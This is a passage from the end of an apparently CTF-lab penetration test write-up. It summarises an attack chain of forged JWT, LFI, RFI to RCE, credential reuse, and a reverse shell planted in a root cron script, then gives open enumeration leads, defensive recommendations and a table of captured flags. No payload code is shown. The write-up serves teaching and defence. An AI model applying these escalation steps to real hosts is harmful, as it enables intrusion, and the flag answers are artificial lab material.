        │
health_report.sh group-writable + root cron trigger  →  pspy64 confirms 60s execution interval,
                                                           crontab location triangulated (4.12)
        │
reverse-shell payload fires on next cron tick  →  root shell via Penelope listener, flag5/root.txt
                                                     captured (4.12)
```

---

## 6. Open Items / Not Yet Explored

- **`root` is fully obtained (Finding 4.12).** The `admin_bot.py`/`admin-bot.service` avenue (Finding 4.11) remains genuinely unresolved and is left open below in case it's of independent interest, but it is no longer the primary open item:
  - Run `getcap -r / 2>/dev/null` (Linux capabilities enumeration — a privesc class not checked against `admin-bot.service` specifically)
  - Read `/usr/share/polkit-1/rules.d/49-ubuntu-admin.rules` and `/etc/polkit-1/rules.d/` to understand exactly why the `admin-bot.service` restart action is scoped to the `ubuntu` account, and whether that logic has an exploitable condition
  - Inspect `/opt/tools/` contents beyond `pspy64` itself, and `~/.viminfo`/`~/.lesshst` on `devops`, for further leads
- `/admin/index.php` — reached via the forged laura.hayes session (Finding 4.6) and its own source fully read (Finding 4.9's investigation); its "User Management" and "File System Access" cards were read but not independently re-tested since
- `reset_tokens` logic flaw flagged in a `forgot.php` source comment ("token NOT bound to requesting user") — the token-consumption endpoint has not been located
- Other `id=` values on `/api/users/profile.php` — `id=1` and `id=5` have been tested (the latter surfaced a "Q3 migration notes: infra review pending approval" note that did not lead anywhere further); the full range has not been enumerated
- `files.php`'s own PHP source was never pulled (flagged in Finding 4.8) — would definitively confirm the exact mechanism (`include()`+`allow_url_include`, a temp-file download-then-execute, or something else) behind the RFI
- SSH (22) — not used as an entry vector this session (access was via web-shell → `su`); given Finding 4.10's credential and its naming, the `devops` password may also work over actual SSH — untested
- `mysql` localhost-only DB (Finding 4.5) — still not directly queried; now that OS-level access exists, `mysql -u app_user -p` from an authenticated shell is viable and untried
- Whether admin_bot.py's SSRF primitive (4.9) can reach anything else interesting on `localhost` beyond what's already been directly enumerated via shell access

---

## 7. Overall Recommendations

1. **Never trust client-held claims without server-side cryptographic verification** — the single disabled signature check in `verify_jwt()` is the root cause that unlocked LFI, secret disclosure, and admin impersonation. This one fix collapses most of the chain.
2. **Enforce object-level authorization on every ID-based endpoint**, independent of authentication state — Finding 4.7 shows authentication alone is not authorization.
3. **Eliminate hardcoded secrets from source**; a single leaked file (via any future disclosure bug) should not be able to compromise every trust boundary in the app at once.
4. **Enforce password policy and screen for reuse/weak passwords** across all accounts, not just high-visibility ones — and critically, **across trust boundaries**, not only within one system. Finding 4.10 shows a database password doubling as a real OS account password; the same weak-password discipline that applies to web logins (Finding 4.2) must extend to infrastructure credentials.
5. **Normalize all user-facing and API error messages** to avoid confirming account existence or internal implementation details (e.g., the real base directory, the specific path-containment logic).
6. **Never fetch or execute remote (attacker-controlled-URL) content server-side** (Finding 4.8) — a path-containment check built for local filesystem traversal does not generalize to URLs; treat local-file access and remote-fetch as entirely separate code paths with separate, much stricter controls (or disallow the latter outright).
7. **Automation/service accounts must never hold long-lived, hardcoded, privileged session credentials** (Finding 4.9) — `admin_bot.py`'s forged admin cookie turns a passive monitoring task into a privileged SSRF primitive the moment any upstream input (ticket content) is attacker-controlled.
8. **Root-executed scripts must never be writable by non-root users or groups** (Findings 4.11 and 4.12) — `admin_bot.py`'s `rwxrwxrwx` permissions alongside a `Restart=always` systemd policy constitute a complete privilege-escalation chain on their own merits, and `health_report.sh`'s group-writable permissions turned out to be the one that actually worked, via a cron trigger rather than a service restart. Two independent instances of the same misconfiguration class on one host is a signal that write-access review for root-executed files needs to be a standard, repeatable check, not a one-off finding.
9. **Audit cron schedules alongside file permissions, not separately.** A script's permissions can look obviously dangerous while its execution trigger stays hidden in a location (a personal crontab) that is deliberately unreadable to the account that can otherwise write to the file. Finding 4.12 was only resolved by treating a `Permission denied` on `/var/spool/cron/crontabs/` as confirming evidence rather than a dead end, after the world-readable locations (`/etc/crontab`, `/etc/cron.d/`) had already been ruled out.

---

## 8. Flags Captured

| #    | Flag                                  | Obtained via                                                                                                                                                                         |
| ---- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1    | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`   | `/api/users/profile.php?id=1` `notes` field, read as `robert.wilson` via a plain authenticated session (Finding 4.7)                                                                 |
| 2    | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` | Source of `admin/index.php`, read via the LFI/forged-JWT chain (Finding 4.4/4.6)                                                                                                     |
| 3    | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       | `/opt/flag3.txt`, read immediately after establishing a shell via RFI→RCE (Finding 4.8)                                                                                              |
| 4    | `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`   | `/home/devops/user.txt`, after `su devops` using the reused `DB_PASS` credential (Finding 4.10)                                                                                      |
| root | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        | `/root/root.txt`, after a reverse shell appended to `health_report.sh` fired on its root-crontab-triggered 60-second execution window, caught via a Penelope listener (Finding 4.12) |
